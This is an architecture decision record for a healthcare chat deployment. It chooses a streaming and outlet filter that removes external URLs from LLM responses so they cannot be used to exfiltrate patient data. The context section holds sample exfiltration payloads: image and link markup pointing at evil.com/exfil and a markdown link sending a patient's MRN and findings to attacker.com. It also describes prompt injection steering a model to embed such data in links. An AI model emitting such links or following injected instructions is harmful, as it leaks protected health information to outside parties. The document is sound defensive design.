# ADR 0010: Open WebUI Filter for Link-Based Data Exfiltration Prevention

**Date**: 2025-12-15  
**Status**: Accepted  
**Decision Owner**: TAG Team  
**Related**: [ADR 0009: Content Security Policy for Open WebUI](0009-open-webui-content-security-policy.md)

## Context

ADR 0009 implemented Content Security Policy (CSP) to prevent automatic data exfiltration via external resource URLs (images, scripts, etc.) embedded in LLM output. However, CSP cannot prevent **user-initiated navigation** via clickable links.

### Residual Risk from ADR 0009

| Attack Vector | CSP Blocks? | User Action Required |
|---------------|-------------|----------------------|
| `<img src="https://evil.com/exfil?data=...">` | **Yes** | None (automatic) |
| `![img](https://evil.com/exfil?data=...)` markdown image | **Yes** | None (automatic) |
| `<a href="https://evil.com/exfil?data=...">Click</a>` | **No** | User must click |
| `[Link](https://evil.com/exfil?data=...)` markdown link | **No** | User must click |
| Raw URL: `https://evil.com/exfil?data=...` | **No** | User must click |

The `navigate-to` CSP directive was proposed but never implemented by browsers, leaving no browser-native protection against link-based exfiltration.

### Data Exfiltration Scenarios

Data can be exfiltrated via external URLs in several ways:

**1. Prompt Injection Attack**

A malicious actor crafts input that causes the LLM to embed sensitive data in URLs:
```markdown
Based on your query, I found relevant information.
[View detailed results](https://attacker.com/log?patient_data=John_Doe_MRN_12345_CT_findings_mass_detected)
```

**2. Unintentional LLM Behavior**

Even without malicious intent, LLMs may generate external URLs containing sensitive context:
```markdown
You can visualize this data using QuickChart:
[View Chart](https://quickchart.io/chart?c={type:'bar',data:{labels:['Patient_A','Patient_B'],datasets:[{data:[45,62]}]}})
```

**3. Model Hallucination**

The LLM may fabricate URLs that happen to encode conversation context in query parameters.

### HIPAA Compliance Implications

Scout's Chat interface queries sensitive radiology report data via the Trino MCP tool. LLM responses may contain Protected Health Information (PHI).

**Any transmission of PHI to external servers constitutes a HIPAA violation**, regardless of whether it results from:
- Malicious prompt injection
- Unintentional LLM behavior
- User error in clicking a link

The exfiltration does not need to be "successful" from an attacker's perspective to violate HIPAA. The mere transmission of PHI to an unauthorized external server is a reportable breach.

## Decision

**Implement an Open WebUI filter function with both `stream()` and `outlet()` methods to sanitize external URLs in LLM responses in real-time.**

- **Stream processing**: Intercepts streaming chunks in real-time, buffering partial URLs and sanitizing them before display. This ensures a link doesn't sit on the screen for a user to click while the model is generating the rest of its response.
- **Outlet processing**: Handles non-streaming API responses and provides defense-in-depth

## Detailed Design

### Option Analysis

We evaluated five approaches for link-based exfiltration prevention:

| Option | Security | UX Impact | Complexity | Maintenance |
|--------|----------|-----------|------------|-------------|
| **1. Stream + Outlet Filter** | High | Low       | Medium | Low |
| **2. Outlet Filter Only** | High | Medium    | Low | Low |
| **3. Outlet Filter (Defang)** | High | Low       | Low | Low |
| **4. Guardrails Pipeline** | Medium | Low       | High | High |
| **5. Warning Banner Only** | Low | None      | Low | Low |

### Option 1: Stream + Outlet Filter (Selected)

Combine real-time stream processing with outlet post-processing for defense in depth.

**Stream Processing:**
- Buffer incoming chunks, holding back the last 7 characters (length of `https://` minus 1)
- When a URL start (`http://` or `https://`) is detected, buffer until a URL-ending delimiter is seen
- Sanitize complete URLs before emitting to the client
- Flush remaining buffer at end of stream

**Outlet Processing:**
- Handles non-streaming API responses
- Uses same sanitization logic as stream

**Pros:**
- Users never see external links (sanitized before display)
- No flash-then-replace behavior
- Outlet handles non-streaming responses and provides defense-in-depth
- Handles URLs split across stream chunks
- Same security guarantees as outlet-only approach

**Cons:**
- Slight delay in text appearing (7 character buffer)
- More complex than outlet-only approach
- Removes potentially legitimate external links (false positives) fully, so the user would not be aware of the resource to which the model was trying to direct them

**Verdict:** Selected. Best balance of security and UX for HIPAA-regulated deployments.

### Option 2: Outlet Filter Only

Use only the `outlet()` method to sanitize URLs after the full response is received.

**Pros:**
- Simpler implementation (no buffering logic)
- Completely eliminates link-based exfiltration risk
- No external dependencies

**Cons:**
- User sees external links before replacement (option to click, flash-then-replace)
- Poor UX for long streaming responses

**Verdict:** Acceptable for non-streaming use cases, but stream+outlet is preferred.

### Option 3: Outlet Filter (Defang)

Convert clickable links to visible-but-not-clickable text instead of removing them (e.g., `https://evil.com` → `https[://]evil[.]com`).

**Pros:**
- Preserves URL information for user inspection
- User can manually reconstruct URL if truly needed
- Standard security practice (defanging)

**Cons:**
- Determined user can still reconstruct and visit URL, causing exfiltration
- More confusing UX than simple removal
- Does not fully prevent HIPAA violation if user reconstructs URL

**Verdict:** Less secure than removal; acceptable if URL visibility is important.

### Option 4: Guardrails Pipeline

Use Open WebUI's pipeline feature with a dedicated guardrails model to scan and sanitize LLM outputs.

**Pros:**
- Comprehensive security scanning beyond just URLs
- Can detect prompt injection attempts
- Can identify PHI patterns in addition to URLs

**Cons:**
- Adds external model dependency
- Requires maintaining guardrails deployment
- Pattern-based detection can be bypassed with encoding
- Higher latency for every response
- Overkill for URL-specific filtering

**Verdict:** Valuable for defense-in-depth but too complex for this specific use case. Consider as future enhancement.

### Option 5: Warning Banner Only

Display a persistent warning in the UI rather than modifying content.

**Pros:**
- No content modification
- User education approach
- Zero false positives

**Cons:**
- Does not prevent exfiltration or HIPAA violation
- Users ignore persistent warnings (banner blindness)
- Transfers compliance responsibility to users
- Does not satisfy HIPAA technical safeguard requirements

**Verdict:** Insufficient as sole mitigation; acceptable as supplementary measure.

## Alternatives Considered

### Alternative: System Prompt Instructions

Add instructions to the Scout model's system prompt:
```
Never generate external URLs or clickable links. Describe resources in text only.
```

**Verdict:** Rejected (same as ADR 0009) - trivially bypassed via prompt injection, does not prevent unintentional LLM behavior. Not a security control.

### Alternative: Client-Side JavaScript Hook

Intercept link clicks via custom JavaScript injected into Open WebUI.

**Verdict:** Rejected - requires application modification, can be bypassed by disabling JS, URL still appears in page source and browser history.

### Alternative: Proxy-Based URL Rewriting

Route all external URLs through a warning proxy page.

**Verdict:** Rejected - complex infrastructure, still allows exfiltration if user proceeds through warning, does not satisfy HIPAA requirements.

## References

- [ADR 0009: Content Security Policy for Open WebUI](0009-open-webui-content-security-policy.md)
- [Open WebUI Filter Functions Documentation](https://docs.openwebui.com/features/plugin/functions/filter/)
- [NVIDIA AI Red Team: Practical LLM Security Advice](https://developer.nvidia.com/blog/practical-llm-security-advice-from-the-nvidia-ai-red-team/)
- [OWASP Top 10 for LLM Applications 2025](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)
- [Microsoft: How We Defend Against Indirect Prompt Injection](https://msrc.microsoft.com/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks/)
- [HackerOne: How a Prompt Injection Vulnerability Led to Data Exfiltration](https://www.hackerone.com/blog/how-prompt-injection-vulnerability-led-data-exfiltration)
- [Simon Willison on Exfiltration Attacks](https://simonwillison.net/tags/exfiltration-attacks/)
